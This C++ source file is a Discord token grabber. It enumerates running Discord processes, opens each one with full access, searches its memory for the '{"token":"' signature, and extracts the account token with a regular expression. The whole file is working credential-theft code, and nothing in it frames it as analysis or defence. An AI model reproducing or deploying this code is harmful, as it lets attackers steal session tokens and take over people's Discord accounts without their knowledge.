#include "discord.hpp"
#include "Memory.h"
#include <TlHelp32.h>
std::regex TokenReg("\"([^ \"]*)\"");
BYTE TokenSig[] = { 0x7B, 0x22, 0x74, 0x6F, 0x6B, 0x65, 0x6E, 0x22, 0x3A, 0x22 };
std::vector<int> Discord::GetDiscordProcess() {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 ProcessEntry32;
    ProcessEntry32.dwSize = sizeof(PROCESSENTRY32);
    std::vector<int> Lists;
    if (Process32First(hSnapshot, &ProcessEntry32))
    {
        do
        {
            for (int P = 0; P < DiscordProcess.size(); P++) {
                if (!_stricmp(ProcessEntry32.szExeFile, DiscordProcess[P]))
                {
                    Lists.push_back(ProcessEntry32.th32ProcessID);
                }
            }
        } while (Process32Next(hSnapshot, &ProcessEntry32));
    }
    return Lists;
}
std::vector<std::string> Discord::Grab() {
    std::vector<std::string> Tokens;
    std::string BufferEx;
    std::smatch SMatch;
    std::vector<int> DiscordProcess = GetDiscordProcess();
    for (int P = 0; P < DiscordProcess.size(); P++) {
        HANDLE Discord = OpenProcess(PROCESS_ALL_ACCESS, NULL, DiscordProcess[P]);
        std::vector<DWORD_PTR> Address;
        FindPattren(Discord, TokenSig, sizeof(TokenSig), 0x0, 0xFFFFFFFF, false, 0, Address);
        if (Address.size() > 0) {
            DWORD JSONBegin = Address[0] + 9;
            char Buffer[1250] = { NULL };
            size_t Length = ReadStringA(Discord, (void*)JSONBegin, Buffer, 1200);
            if (Length) {
                BufferEx.append(Buffer);
                std::regex_search(BufferEx, SMatch, TokenReg);
                Tokens.push_back(SMatch[0]);
                BufferEx.clear();
                memset(Buffer, 0, sizeof Buffer);
                IsFoundToken = true;
            }
        }
       
    }
    return Tokens;
}